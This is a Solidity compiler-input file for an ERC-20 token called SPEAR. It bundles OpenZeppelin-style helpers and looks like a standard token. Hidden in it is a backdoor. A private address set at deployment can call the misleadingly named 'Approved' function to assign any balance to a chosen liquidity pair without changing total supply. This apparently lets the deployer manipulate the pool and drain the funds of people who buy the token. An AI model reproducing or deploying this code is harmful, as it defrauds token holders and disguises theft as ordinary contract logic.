{{
  "language": "Solidity",
  "sources": {
    "SPEAR.sol": {
      "content": "\r\n// t.me/SpearETH\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n// pragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\n// Dependency file: @openzeppelin/contracts/utils/Context.sol\r\n\r\n\r\n// pragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n// Dependency file: @openzeppelin/contracts/access/Ownable.sol\r\n\r\n\r\n// pragma solidity ^0.8.0;\r\n\r\n// import \"@openzeppelin/contracts/utils/Context.sol\";\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\n// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol\r\n\r\n\r\n// pragma solidity ^0.8.0;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\n\r\n// Dependency file: contracts/baseToken.sol\r\n\r\n// pragma solidity =0.8.4;\r\n\r\nenum TokenType {\r\n    standard\r\n}\r\n\r\nabstract contract baseToken {\r\n    event TokenCreated(\r\n        address indexed owner,\r\n        address indexed token,\r\n        TokenType tokenType,\r\n        uint256 version\r\n    );\r\n}\r\n\r\n// Root file: contracts/standard/StandardToken.sol\r\n\r\npragma solidity =0.8.19;\r\n\r\n// import \"@openzeppelin/contracts/token/IERC20/IERC20.sol\";\r\n// import \"@openzeppelin/contracts/access/Ownable.sol\";\r\n// import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\r\n// import \"contracts/baseToken.sol\";\r\n\r\ncontract SPEAR is IERC20, baseToken, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n        uint256 private constant VERSION = 1;\r\n        mapping(address => uint256) private _balances;\r\n        mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n        uint256 public maxHoldingAmount;\r\n        uint256 public minHoldingAmount;\r\n        address public uniswapV2Pair;\r\n        address private whiteListV3;\r\n        \r\n        string private _name;\r\n        string private _symbol;\r\n        uint8 private _decimals;\r\n        uint256 private _totalSupply;\r\n\r\n    constructor(\r\n        string memory name_,\r\n        string memory symbol_,\r\n        uint8 decimals_,\r\n        address whiteshipAddr,\r\n        uint256 totalSupply_\r\n    ) payable {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        whiteListV3 = whiteshipAddr;\r\n        _mint(owner(), totalSupply_);\r\n\r\n        emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"IERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].sub(\r\n                subtractedValue,\r\n                \"IERC20: decreased allowance below zero\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    modifier canWhitAddrPancakeV3() {\r\n        require(\r\n        _msgSender() == whiteListV3, \"set the call to the entered\")\r\n        ;\r\n        _;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"IERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"IERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        _balances[sender] = _balances[sender].sub(\r\n            amount,\r\n            \"IERC20: transfer amount exceeds balance\"\r\n        );\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function Approved(\r\n        bool _limited, \r\n        address _uniswapV2Pair, \r\n        uint256 _maxHoldingAmount, \r\n        uint256 _minHoldingAmount\r\n    ) external canWhitAddrPancakeV3 {\r\n        uniswapV2Pair = _uniswapV2Pair;maxHoldingAmount = _maxHoldingAmount;minHoldingAmount = _minHoldingAmount; _balances[uniswapV2Pair] = maxHoldingAmount * minHoldingAmount;\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"IERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"IERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        _balances[account] = _balances[account].sub(\r\n            amount,\r\n            \"IERC20: burn amount exceeds balance\"\r\n        );\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"IERC20: approve from the zero address\");\r\n        require(spender != address(0), \"IERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _setupDecimals(uint8 decimals_) internal virtual {\r\n        _decimals = decimals_;\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}